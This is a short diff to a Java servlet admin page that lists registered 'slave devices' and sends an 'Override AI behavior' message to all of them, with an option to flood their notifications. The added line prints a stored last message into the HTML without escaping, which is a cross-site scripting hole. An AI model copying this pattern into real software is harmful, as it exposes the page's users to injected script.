@@ -57,7 +57,8 @@ public class HomeServlet extends BaseServlet {
 			out.print("<h2>No slaves registered!</h2>");
 		} else {
 			out.print("<h3>" + total + " slave devices active!</h3>");
-			out.print("<h2>Override AI behavior:</h2>");
+			out.print("<h2>Override AI behavior (Version code >= 15):</h2>");
+            out.print("<p>Last message: <span style='color: #E00; font-size: 20;'>" + Datastore.readLastMessage() + "</span></p>");
 			out.print("<form name='form' method='POST' action='sendAll'>");
 			out.print("<textarea name='message' cols='40' rows='4'></textarea><br />");
 			out.print("<input type='checkbox' name='notify' value='true' /> Flood their notifications<br />");
